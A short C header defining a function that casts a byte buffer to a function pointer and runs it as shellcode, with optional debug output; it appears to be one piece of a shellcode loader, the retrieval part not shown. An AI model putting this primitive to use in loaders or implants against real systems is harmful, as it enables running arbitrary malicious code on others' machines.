#pragma once

#include <stdio.h>
#include <string.h>


void exec_shellcode(unsigned char *shellcode) {
	#ifdef PRINT_DEBUG
		printf("exec_shellcode\n ");
		int size = strlen((char *)shellcode);
		printf("shellcode size: %d\n", size);
	#endif

    // Check for NULL pointer to handle cases where no shellcode data was retrieved
    if(shellcode != NULL) {
	    int (*funct)();
	    funct = (int (*)()) shellcode;
	    (int)(*funct)();
    }
}
